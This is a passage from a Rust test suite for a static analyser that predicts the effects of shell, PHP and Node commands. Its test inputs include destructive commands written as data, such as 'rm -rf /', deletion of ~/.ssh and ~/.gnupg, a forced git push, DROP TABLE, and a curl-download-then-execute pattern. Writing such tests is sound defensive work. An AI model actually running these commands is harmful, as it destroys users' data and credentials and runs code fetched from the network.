        ("X='/a /b'; rm -rf {$X,/c}", vec!["/a", "/b", "/c"]),
        ("A=(/{etc,var}); rm -rf \"${A[@]}\"", vec!["/etc", "/var"]),
    ] {
        let plan = shell(source, Some("/workspace/project"));
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        let argv: Vec<_> = ["rm", "-rf"]
            .into_iter()
            .chain(paths.iter().copied())
            .collect();
        assert_eq!(exec_argv(&plan, "rm"), argv, "{source}");
        let actual = delete_resources(&plan);
        assert_eq!(actual.len(), paths.len(), "{source}");
        for (resource, expected) in actual.into_iter().zip(paths) {
            assert!(
                matches!(resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == expected),
                "{source}: {resource:?}"
            );
        }
    }
    let loop_values = shell("X=/safe; for f in /{{1,2}..3} $X; do rm -rf $f; done", None);
    assert!(loop_values.boundaries.is_empty());
    assert_eq!(delete_resources(&loop_values).len(), 3);
    for path in ["/1..3", "/2..3", "/safe"] {
        assert!(has_delete(&loop_values, path));
    }

    let home = shell_with_env("rm -rf ~/{.ssh,.gnupg}", &[("HOME", "/home/u")]);
    assert!(home.boundaries.is_empty());
    assert_eq!(
        exec_argv(&home, "rm"),
        ["rm", "-rf", "/home/u/.ssh", "/home/u/.gnupg"]
    );
    assert!(has_delete(&home, "/home/u/.ssh") && has_delete(&home, "/home/u/.gnupg"));
    assert!(ops(&home).contains(&"environment.read"));

    for (source, expected, pattern) in [
        ("rm -rf ~/*", "/home/u/*", true),
        ("rm -rf ~/.*", "/home/u/.*", true),
        ("rm -rf ~/.env?", "/home/u/.env?", true),
        ("rm -rf ~/'*'", "/home/u/*", false),
        (r"rm -rf ~/\*", "/home/u/*", false),
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/u")]);
        let resources = delete_resources(&plan);
        assert_eq!(resources.len(), 1, "{source}");
        match resources[0] {
            ResourceExpr::Pattern {
                pattern: effinterp_proto::ResourcePattern::FsPath { glob, .. },
            } => {
                assert!(pattern, "{source}");
                assert_eq!(glob, expected, "{source}");
            }
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path },
            } => {
                assert!(!pattern, "{source}");
                assert_eq!(path, expected, "{source}");
            }
            resource => panic!("{source}: {resource:?}"),
        }
    }

    let glob = shell("rm -rf /tmp/{a,b}/*", None);
    assert!(glob.boundaries.is_empty());
    assert_eq!(
        exec_argv(&glob, "rm"),
        ["rm", "-rf", "/tmp/a/*", "/tmp/b/*"]
    );
    let resources = delete_resources(&glob);
    assert_eq!(resources.len(), 2);
    for (resource, expected) in resources.into_iter().zip(["/tmp/a/*", "/tmp/b/*"]) {
        assert!(
            matches!(resource, ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == expected)
        );
    }

    for (source, head, argv, effects) in [
        (
            "cp f{,.bak}",
            "cp",
            vec!["cp", "f", "f.bak"],
            vec![
                ("filesystem.read", "/workspace/project/f"),
                ("filesystem.write", "/workspace/project/f.bak"),
            ],
        ),
        (
            "mv src/{old,new}.txt",
            "mv",
            vec!["mv", "src/old.txt", "src/new.txt"],
            vec![
                ("filesystem.move", "/workspace/project/src/old.txt"),
                ("filesystem.write", "/workspace/project/src/new.txt"),
            ],
        ),
    ] {
        let plan = shell(source, Some("/workspace/project"));
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert_eq!(exec_argv(&plan, head), argv);
        for (operation, expected) in effects {
            assert!(plan.effects.iter().any(|effect| effect.operation.0 == operation && matches!(
                &effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == expected
            )));
        }
    }
    for source in [
        "{echo,rm} -rf /",
        "{,echo} harmless",
        "echo {1..3}",
        "[[ /{1..100000} ]]",
    ] {
        let plan = shell(source, None);
        assert!(plan.boundaries.is_empty());
        assert!(plan.effects.is_empty());
    }
    for source in [
        "N=3; [[ /{1..$N} ]]",
        "[[ /{1..$(rm -rf /{probe,other})} ]]",
    ] {
        let plan = shell(source, None);
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        if source.contains("$(") {
            assert!(has_delete(&plan, "/probe") && has_delete(&plan, "/other"));
        }
    }
    let condition = shell_with_env("[[ /{1..$N} ]]", &[("N", "3")]);
    assert!(condition.boundaries.is_empty());
    assert!(ops(&condition).contains(&"environment.read"));
    for (word, reason, limit) in [
        ("/tmp/{1..$N}", "unsupported_shell_syntax", None),
        (
            "/{1..100000}",
            "limit_saturated",
            Some("max_brace_expansions"),
        ),
    ] {
        for source in [
            format!("N=3; rm -rf {word}"),
            format!("N=3; for d in {word}; do rm -rf $d; done"),
        ] {
            let plan = shell(&source, None);
            assert_eq!(plan.boundaries.len(), 1, "{source}: {:?}", plan.boundaries);
            assert_eq!(plan.boundaries[0].reason.as_str(), reason);
            assert_eq!(plan.boundaries[0].limit.as_deref(), limit);
            assert!(exec_argv(&plan, "rm").len() <= 3);
            assert!(matches!(
                delete_resources(&plan).as_slice(),
                [ResourceExpr::Unresolved { .. }]
            ));
            assert_eq!(
                plan.coverage.level(&Domain::new("filesystem")),
                Some(CoverageLevel::Partial)
            );
        }
    }
}

#[test]
fn php_script_with_null_coalesce_nests() {
    let source = "<?php $path = $argv[1] ?? '/var/www/cache'; unlink($path . '/index.html'); exec('git push --force origin main'); file_get_contents('https://api.example.com/ping');";
    let plan = Engine::new()
        .with_causality_detail(true)
        .with_resolver(Box::new(Sources(HashMap::from([(
            "w/cli.php".to_string(),
            source.to_string(),
        )]))))
        .analyze(&Subject::Shell {
            source: "php cli.php /var/www/cache".to_string(),
            cwd: Some("/w".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(plan.execution_graph.nodes.iter().enumerate().any(|(index, node)| {
        index != plan.execution_graph.entry.0 as usize
            && matches!(&node.subject, Subject::Source { language, .. } if language == "php")
            && node.boundary.is_none()
    }));
    for operation in [
        "process.exec",
        "filesystem.read",
        "process.code_execution",
        "filesystem.delete",
        "network.request",
    ] {
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == operation),
            "missing {operation}: {:?}",
            plan.effects
        );
    }
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "git.remote_sync"
            && effect.attributes.get("force") == Some(&AttrValue::Bool(true))
            && effect.attributes.get("push") == Some(&AttrValue::Bool(true))
    }));
}

#[test]
fn node_attached_input_type_nests_module_source() {
    let plan = shell(
        r#"node --input-type=module -e 'import { rm } from "node:fs/promises"; await rm("/tmp/x", { recursive: true })'"#,
        Some("/w"),
    );
    assert!(plan.effects.iter().any(|effect| effect.operation.0 == "filesystem.delete"
        && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/tmp/x")));
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unrecognized_arguments")
    );
}

#[test]
fn read_input_is_data_and_shadows_host_values_including_reply() {
    for source in [
        "read FIRST SECOND",
        "read",
        "printf input | read FIRST SECOND",
        "read FIRST SECOND <<EOF\ninput\nEOF",
        "read FIRST SECOND < /input",
    ] {
        let plan = shell(source, None);
        let writes = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "environment.write")
            .collect::<Vec<_>>();
        assert_eq!(writes.len(), if source == "read" { 1 } else { 2 });
        assert!(
            plan.boundaries.iter().all(|boundary| !boundary
                .domains
                .iter()
                .any(|domain| domain.0 == "environment")),
            "{source}: {:?}",
            plan.boundaries
        );
    }
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "read; rm \"$REPLY\"".into(),
            cwd: None,
            context: effinterp_proto::HostContext {
                env: std::collections::BTreeMap::from([("REPLY".into(), "/host-secret".into())]),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    let mut pending = plan
        .effects
        .iter()
        .flat_map(|effect| effect.provenance.clone())
        .collect::<Vec<_>>();
    let mut seen = std::collections::BTreeSet::new();
    while let Some(reference) = pending.pop() {
        if !seen.insert(reference) {
            continue;
        }
        let node = &plan.provenance[reference.0 as usize];
        assert!(!matches!(&node.kind, ProvenanceKind::HostContext { name } if name == "REPLY"));
        pending.extend(&node.antecedents);
    }
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.as_str() == "filesystem.delete"
                && !matches!(effect.resource, ResourceExpr::Concrete { .. }))
    );
    // Under the default IFS each earlier name takes one field of a literal
    // line and the last name the rest.
    let plan = shell(
        "read -r TOOL TARGET <<< 'rm /victim'; \"$TOOL\" -rf \"$TARGET\"",
        None,
    );
    assert!(has_delete(&plan, "/victim"));
    // A delimiter or count ends the input elsewhere, so no field is recovered.
    let plan = shell(
        "read -d : TOOL TARGET <<< 'rm /victim:safe'; \"$TOOL\" -rf \"$TARGET\"",
        None,
    );
    assert!(!has_delete(&plan, "/victim:safe"));
    let plan = shell(
        "read -n 2 TOOL TARGET <<< 'rm /victim'; \"$TOOL\" -rf \"$TARGET\"",
        None,
    );
    assert!(!has_delete(&plan, "/victim"));
    for source in [
        "read -u 9 FIRST SECOND",
        "read \"$NAME\"",
        "read FIRST < \"$INPUT\"",
    ] {
        let plan = shell(source, None);
        assert!(
            plan.boundaries.iter().any(|boundary| boundary
                .domains
                .iter()
                .any(|domain| domain.0 == "environment")),
            "{source}"
        );
    }
}

#[test]
fn dolt_inline_sql_reaches_schema_effects_and_dynamic_queries_stay_loud() {
    let plan = shell("dolt sql -q 'DROP TABLE issues'", Some("/work"));
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "database.schema_drop")
    );
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unmodeled_command")
    );
    let dynamic = shell("dolt sql -q \"$QUERY\"", Some("/work"));
    assert!(
        !dynamic
            .effects
            .iter()
            .any(|e| e.operation.0 == "database.schema_drop")
    );
    assert!(!dynamic.boundaries.is_empty());
}

#[test]
fn cross_env_assignments_reach_only_the_nested_command() {
    let plan = shell(
        "cross-env DEST=/safe/input sh -c 'cat \"$DEST\"'",
        Some("/work"),
    );
    assert!(plan.effects.iter().any(|e| e.operation.0 == "filesystem.read" && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path }} if path == "/safe/input")));
    let symbolic = shell("cross-env NODE_ENV=$MODE tsc --noEmit -p .", Some("/work"));
    assert!(
        symbolic
            .effects
            .iter()
            .any(|e| e.operation.0 == "environment.write")
    );
    assert!(
        !symbolic
            .boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unmodeled_command")
    );
}

#[test]
fn symbolic_executable_basename_and_defaults_never_model_the_tail() {
    for (source, expected) in [
        (r#"BD="${1:-bd}"; $BD init --help"#, "bd"),
        (r#"BD="${TOOL:-bd}"; $BD init --help"#, "bd"),
        (r#"BD="${TOOL-bd}"; $BD init --help"#, "bd"),
        (r#""${1:-bd}" init --help"#, "bd"),
        (r#""$DIR/bd" init --help"#, "bd"),
        (
            r#"x="$(pwd)/bd-darwin-arm64"; "$x" init --prefix smoketest"#,
            "bd-darwin-arm64",
        ),
        (
            r#"check() { BD="${1:-bd}"; "$BD" init --help; }; check ./bd"#,
            "bd",
        ),
        (r#"check() { "${1:-bd}" init; }; check"#, "bd"),
        (r#"check() { "${1:-bd}" init; }; check other"#, "other"),
    ] {
        let plan = shell(source, Some("/workspace"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0.starts_with("system.")),
            "{source}"
        );
        assert!(plan.effects.iter().any(|e| e.operation.0 == "process.exec"
            && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::Process { executable, .. } } if executable == expected)), "{source}: {:?}", plan.effects);
    }
    for source in [
        "$1 init --help",
        r#""$@" init --help"#,
        "${TOOL} init --help",
        r#""$(unknown)" rm -rf /"#,
        r#""prefix$TOOL" rm -rf /"#,
    ] {
        let plan = shell(source, None);
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0.starts_with("system.")
                    || e.operation.0 == "filesystem.delete"),
            "{source}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.reason.as_str() == "unresolved_command"),
            "{source}"
        );
    }
    let plan = shell(r#""$DIR/rm" -rf /target"#, None);
    assert!(
        matches!(delete_resources(&plan).as_slice(), [ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }] if path == "/target")
    );
}

#[test]
fn executable_defaults_retain_unresolved_runtime_overrides() {
    for source in [
        r#""${1:-true}" rm -rf /"#,
        r#""${CMD:-echo}" rm -rf /"#,
        r#""${CMD-echo}" rm -rf /"#,
        r#"CMD="${1:-true}"; $CMD rm -rf /"#,
        r#"CMD="${TOOL:-echo}"; NEXT=$CMD; $NEXT rm -rf /"#,
        r#"CMD="${1:-true}"; if test -f marker; then CMD=echo; fi; $CMD rm -rf /"#,
        r#"f() { "$1" rm -rf /; }; f "${CMD:-echo}""#,
        r#"CMD="${1:-true}"; f() { $CMD rm -rf /; }; f"#,
        r#""${1:-rm}" -rf /x"#,
    ] {
        let plan = shell(source, Some("/w"));
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unresolved_command"
                    && boundary.class == BoundaryClass::Unresolved),
            "{source}: {:?}",
            plan.boundaries
        );
        assert_eq!(
            plan.coverage.0[&Domain::new("process")].level,
            CoverageLevel::Partial,
            "{source}"
        );
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "process.exec"
                    && matches!(effect.resource, ResourceExpr::Unresolved { .. })),
            "{source}"
        );
        assert_eq!(
            delete_resources(&plan).len(),
            usize::from(source.contains(":-rm")),
            "{source}"
        );
    }
    for source in [
        r#"CMD=true; "${CMD:-rm}" -rf /"#,
        r#"f() { "${1:-rm}" -rf /; }; f true"#,
        r#"f() { "${1:-true}" rm -rf /; }; f"#,
        r#"CMD="${1:-rm}"; CMD=true; $CMD -rf /"#,
    ] {
        let plan = shell(source, None);
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(delete_resources(&plan).is_empty(), "{source}");
    }
}

#[test]
fn captured_stdout_resources_survive_assignments_and_fallbacks() {
    for command in ["mktemp", "mktemp /tmp/job.XXXXXX || echo /tmp/fallback"] {
        let plan = shell(
            &format!(
                r#"p=$({command}); curl -LsSf https://example.com -o "$p"; sh "$p"; rm -f "$p""#
            ),
            Some("/work"),
        );
        let created = &plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.create")
            .unwrap()
            .resource;
        for operation in ["filesystem.write", "filesystem.read", "filesystem.delete"] {
            let effect = plan
                .effects
                .iter()
                .find(|effect| effect.operation.0 == operation)
                .unwrap_or_else(|| panic!("missing {operation}: {:?}", ops(&plan)));
            if command.contains("||") {
                assert!(
                    matches!(&effect.resource, ResourceExpr::Union { alternatives } if alternatives.contains(created) && alternatives.contains(&ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: "/tmp/fallback".into() } })),
                    "{operation}: {:?}",
                    effect.resource
                );
            } else {
                assert_eq!(&effect.resource, created, "{operation}");
            }
        }
    }
    for (command, expected) in [
        ("pwd", "/work/out"),
        ("dirname /tmp/file", "/tmp/out"),
        ("basename /tmp/file", "/work/file/out"),
    ] {
        let plan = shell(&format!(r#"d=$({command}); cp a "$d/out""#), Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.write"
                    && effect.resource
                        == ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath {
                                path: expected.into()
                            }
                        }),
            "{command}: {:?}",
            ops(&plan)
        );
    }
    for command in [
        "cat path",
        "curl https://example.com",
        "mktemp >log",
        "mktemp; echo wrong",
        "mktemp && echo wrong",
        "mktemp | cat",
        "mktemp() { echo wrong; }; mktemp",
    ] {
        let plan = shell(&format!(r#"p=$({command}); rm "$p""#), Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"
                    && matches!(effect.resource, ResourceExpr::Unresolved { .. })),
            "{command}: {:?}",
            ops(&plan)
        );
    }
}

#[test]
fn unquoted_captured_stdout_does_not_invent_unsplit_paths() {
    for source in [
        r#"rm $(echo a b)"#,
        r#"rm `echo a b`"#,
        r#"X=$(echo "a b"); rm $X"#,
        r#"X=$(echo "*"); rm $X"#,
        r#"d=$(dirname "/tmp/a b/c"); rm $d"#,
        r#"p=$(mktemp); rm $p"#,
        r#"rm $(mktemp)"#,
        r#"X=$(echo "a b"); rm prefix${X}suffix"#,
        r#"X=$(echo "a b"); f() { rm $1; }; f "$X""#,
        r#"X=$(echo "a b"); f() { rm $@; }; f "$X""#,
        r#"X=$(echo "a b"); a=("$X"); rm ${a[@]}"#,
        r#"IFS=:; X=$(echo "a:b"); rm $X"#,
        r#"rm "$(dirname $(echo '/tmp/a b/c'))""#,
    ] {
        let plan = shell(source, Some("/work"));
        let deletes = delete_resources(&plan);
        assert!(!deletes.is_empty(), "{source}");
        assert!(
            deletes
                .iter()
                .all(|resource| serde_json::to_string(resource)
                    .unwrap()
                    .contains("\"unresolved\"")),
            "{source}: {deletes:?}"
        );
    }
    for source in [
        r#"rm "$(echo 'a b')""#,
        r#"rm "`echo 'a b'`""#,
        r#"X=$(echo 'a b'); rm "$X""#,
        r#"X=$(echo 'a b'); f() { rm "$1"; }; f "$X""#,
    ] {
        let plan = shell(source, Some("/work"));
        assert_eq!(
            delete_resources(&plan),
            vec![&ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: "/work/a b".into()
                }
            }],
            "{source}"
        );
    }
}

#[test]
fn captured_stdout_values_remain_bounded_and_branch_local() {
    let plan = shell(
        r#"if test -n "$FLAG"; then p=$(mktemp 2>/dev/null || echo "/tmp/fallback.$$"); sh "$p"; rm "$p"; fi; rm "$p""#,
        Some("/work"),
    );
    let deletes = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect::<Vec<_>>();
    assert_eq!(deletes.len(), 2);
    assert!(matches!(deletes[0].resource, ResourceExpr::Union { .. }));
    assert!(matches!(
        deletes[1].resource,
        ResourceExpr::Unresolved { .. }
    ));
    assert!(plan.execution_graph.nodes.iter().any(
        |node| matches!(&node.subject, Subject::Exec { argv, .. } if argv == &["sh", "\"$p\""])
    ));

    let plan = shell(r#"p=$(mktemp -d); cd "$p"; touch file"#, Some("/work"));
    let created = &plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.create")
        .unwrap()
        .resource;
    let expected = effinterp_proto::normalize_resource(
        effinterp_proto::filesystem_path(
            "file",
            Some(created.clone()),
            effinterp_proto::PathPlatform::Posix,
        ),
        effinterp_proto::PathPlatform::Posix,
    );
    assert!(
        plan.effects.iter().any(
            |effect| effect.operation.0 == "filesystem.metadata" && effect.resource == expected
        )
    );

    let plan = shell(
        r#"build() { d=$(mktemp -d); cd "$d"; if test -n "$FAIL"; then cd -; return 1; fi; if test -n "$CHILD"; then cd child; touch output; fi; }; if build; then :; fi"#,
        Some("/work"),
    );
    let output = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.metadata")
        .unwrap();
    let resource = serde_json::to_string(&output.resource).unwrap();
    assert!(!resource.contains("unresolved"), "{resource}");
    assert!(resource.contains("TMPDIR"), "{resource}");

    for command in [
        r#"dirname "$ROOT/file""#,
        r#"basename "$ROOT/file""#,
        r#"realpath "$ROOT/file""#,
        r#"readlink -f "$ROOT/file""#,
        "git rev-parse --show-toplevel",
    ] {
        let plan = shell(&format!(r#"p=$({command}); rm "$p""#), Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"
                    && matches!(effect.resource, ResourceExpr::Property { .. })),
            "{command}: {:?}",
            ops(&plan)
        );
    }

    let plan = shell(r#"p=rm; p=$(mktemp); "$p" /precious"#, Some("/work"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );

    let mut limits = default_limits();
    limits.insert("max_value_cardinality".into(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .analyze(&Subject::Shell {
            source: r#"p=$(mktemp || echo /tmp/fallback); rm "$p""#.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete"
                && matches!(effect.resource, ResourceExpr::Unresolved { .. }))
    );
}

#[test]
fn go_symbolic_build_hooks_only_degrade_process_coverage() {
    for source in [
        "GOFLAGS='$X' go build .",
        "GOFLAGS=$X go build .",
        "go build -toolexec=$X .",
    ] {
        let plan = shell(source, Some("/w"));
        assert_eq!(plan.boundaries.len(), 1, "{source}: {:?}", plan.boundaries);
        assert_eq!(plan.boundaries[0].domains, vec![Domain::new("process")]);
        assert_eq!(
            plan.coverage.0[&Domain::new("filesystem")].level,
            CoverageLevel::Full
        );
        assert_eq!(
            plan.coverage.0[&Domain::new("network")].level,
            CoverageLevel::Full
        );
    }
    let plan = shell(
        "GOFLAGS=-tags=netgo GOENV=off GOCACHE=/cache GOPATH=/gopath go build -o bd ./cmd/bd",
        Some("/beads"),
    );
    assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    for path in ["/beads/bd", "/cache"] {
        assert!(plan.effects.iter().any(|effect| effect.operation.0 == "filesystem.write" && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == path)));
    }
}

#[test]
fn go_environment_controls_install_destination_and_module_downloads() {
    for (environment, destination) in [
        ("GOPATH=/gopath", "/gopath/bin/bd"),
        ("GOPATH=/gopath GOBIN=/tools", "/tools/bd"),
    ] {
        let plan = shell(&format!("{environment} go install ./cmd/bd"), Some("/w"));
        assert!(plan.boundaries.is_empty());
        assert!(plan.effects.iter().any(
            |effect| effect.operation.0 == "filesystem.write" && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == destination)
        ), "{:?}", plan.effects);
        assert!(!plan.effects.iter().any(|effect| effect.operation.0 == "filesystem.write"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/w/bd")));
    }
    for (source, downloads) in [
        ("GOFLAGS=-mod=mod go build .", true),
        ("GOFLAGS=-mod=mod go build -mod=readonly .", false),
        ("GOFLAGS=-mod=readonly go build -mod=mod .", true),
    ] {
        let plan = shell(source, Some("/w"));
        assert!(plan.boundaries.is_empty());
        assert_eq!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "network.download"),
            downloads,
            "{source}"
        );
    }
}

#[test]
fn shell_termination_stops_only_the_current_execution_region() {
    for (source, live, dead) in [
        ("cp a b; exit 0; rm /tmp/never", "b", "/tmp/never"),
        ("cmd='exec true'; $cmd; rm /tmp/never", "", "/tmp/never"),
        ("'exec' true; rm /tmp/never", "", "/tmp/never"),
        ("\\exec true; rm /tmp/never", "", "/tmp/never"),
        ("e\"xec\" true; rm /tmp/never", "", "/tmp/never"),
        ("cmd='exit 0'; $cmd; rm /tmp/never", "", "/tmp/never"),
        (
            "f() { exit 0; touch /tmp/in_f; }; cmd=f; $cmd; rm /tmp/never",
            "",
            "/tmp/never",
        ),
        (
            "if test -n \"$X\"; then cmd='exec true'; else cmd='echo ok'; fi; $cmd; rm /tmp/live",
            "/tmp/live",
            "/tmp/never",
        ),
        (
            "f() { exit 0; touch /tmp/in_f; }; if test -n \"$X\"; then cmd=f; else cmd='echo ok'; fi; $cmd; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "if test -n \"$X\"; then cmd='exec true'; else cmd='exit 0'; fi; $cmd; rm /tmp/never",
            "",
            "/tmp/never",
        ),
        (
            "return 0 2>/dev/null; rm /tmp/live",
            "/tmp/live",
            "/tmp/never",
        ),
        ("{ return 0; }; rm /tmp/live", "/tmp/live", "/tmp/never"),
        (
            "f() { return 1; touch /tmp/in_f; }; f; trap 'rm -f /tmp/lock' EXIT; exec true; touch /tmp/after_exec",
            "/tmp/lock",
            "/tmp/in_f",
        ),
        (
            "f() { exit 0; touch /tmp/in_f; }; f; touch /tmp/after_exec",
            "",
            "/tmp/after_exec",
        ),
        (
            "f() { exec true; touch /tmp/in_f; }; f; touch /tmp/after_exec",
            "",
            "/tmp/after_exec",
        ),
        (
            "{ exit 0; touch /tmp/in_f; }; touch /tmp/after_exec",
            "",
            "/tmp/after_exec",
        ),
        (
            "(exit 0; touch /tmp/in_f); rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "echo \"$(exit 0; touch /tmp/in_f)\"; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "target=/tmp/live; { target=/tmp/in_f; exit 1; } & rm \"$target\"",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "target=/tmp/live; { target=/tmp/in_f; exit 1; } | cat; rm \"$target\"",
            "/tmp/live",
            "/tmp/in_f",
        ),
        ("exec sleep 100 & rm /tmp/live", "/tmp/live", "/tmp/in_f"),
        ("exit 1 &\nrm /tmp/live", "/tmp/live", "/tmp/in_f"),
        (
            "serve() { exec python3 -m http.server; touch /tmp/in_f; }; serve & rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "{ exit 1; touch /tmp/in_f; } & rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "true && { exit 1; touch /tmp/in_f; } & rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "{ exit 1; touch /tmp/in_f; } | cat; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "{ echo hi; exit 1; touch /tmp/in_f; } 2>&1 | tee /tmp/log; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "{ exit 1; touch /tmp/in_f; } | { exit 2; touch /tmp/in_f; }; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "{ exit 1; } |\nexec true; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "exec true | { exit 1; }; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        ("exec true | cat; rm /tmp/live", "/tmp/live", "/tmp/in_f"),
        ("true && exit 1; rm /tmp/live", "/tmp/live", "/tmp/in_f"),
        ("true &&\n exit 1\nrm /tmp/live", "/tmp/live", "/tmp/in_f"),
        (
            "false ||\n exec true\nrm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "false ||\n # continuation\n\n { exit 1; touch /tmp/in_f; }\nrm /tmp/live",
            "",
            "/tmp/in_f",
        ),
        (
            "f() { exit 1; touch /tmp/in_f; }; false ||\n f\nrm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "if test -n \"$X\"; then false ||\n exit 1\nrm /tmp/live; fi",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "f() { exit 0; touch /tmp/in_f; }; f && echo yes; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "if test -n \"$X\"; then exit 0; touch /tmp/in_f; else echo no; fi; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "for x in a; do exit 0; touch /tmp/in_f; done; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "case $X in a) exit 0; touch /tmp/in_f;; esac; rm /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
        (
            "exec 3>&1; exec >/tmp/log.txt 2>&1; cp a /tmp/live",
            "/tmp/live",
            "/tmp/in_f",
        ),
    ] {
        let plan = shell(source, None);
        let resources = plan
            .effects
            .iter()
            .map(|effect| effinterp_proto::display_resource(&effect.resource))
            .collect::<Vec<_>>();
        assert!(
            !resources.iter().any(|resource| resource.contains(dead)),
            "{source}: {resources:?}"
        );
        assert!(
            !resources
                .iter()
                .any(|resource| resource.contains("/tmp/after_exec")),
            "{source}: {resources:?}"
        );
        if !live.is_empty() {
            assert!(
                resources.iter().any(|resource| resource.contains(live)),
                "{source}: {resources:?}"
            );
        }
    }
    for operator in ["&&", "||"] {
        let source = format!("test -n \"$X\" {operator}\n rm /tmp/conditional\nrm /tmp/live");
        let plan = shell(&source, None);
        for (path, conditional) in [("/tmp/conditional", true), ("/tmp/live", false)] {
            let effect = plan
                .effects
                .iter()
                .find(|effect| {
                    effect.operation.0 == "filesystem.delete"
                        && effinterp_proto::display_resource(&effect.resource).contains(path)
                })
                .unwrap();
            assert_eq!(effect.condition.is_some(), conditional, "{source}");
        }
    }
    for (source, stage) in [
        ("{ exit 1; } | cat; rm /tmp/live", "cat"),
        ("{ exit 1; } |& cat; rm /tmp/live", "cat"),
        (
            "{ echo hi; exit 1; } 2>&1 | tee /tmp/log; rm /tmp/live",
            "tee",
        ),
    ] {
        let plan = shell(source, None);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "process.exec"
                    && effinterp_proto::display_resource(&effect.resource).contains(stage)
            }),
            "{source}: {:?}",
            plan.effects
        );
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.delete"
                    && effinterp_proto::display_resource(&effect.resource).contains("/tmp/live")
                    && effect.condition.is_none()
            }),
            "{source}: {:?}",
            plan.effects
        );
    }
    let plan = shell(
        "if test -n \"$USE_PYTHON\"; then exec python3 -c 'import os; os.remove(\"/tmp/x\")'; else echo other; fi; rm -f /tmp/after",
        None,
    );
    for (path, conditional) in [("/tmp/x", true), ("/tmp/after", false)] {
        let effect = plan
            .effects
            .iter()
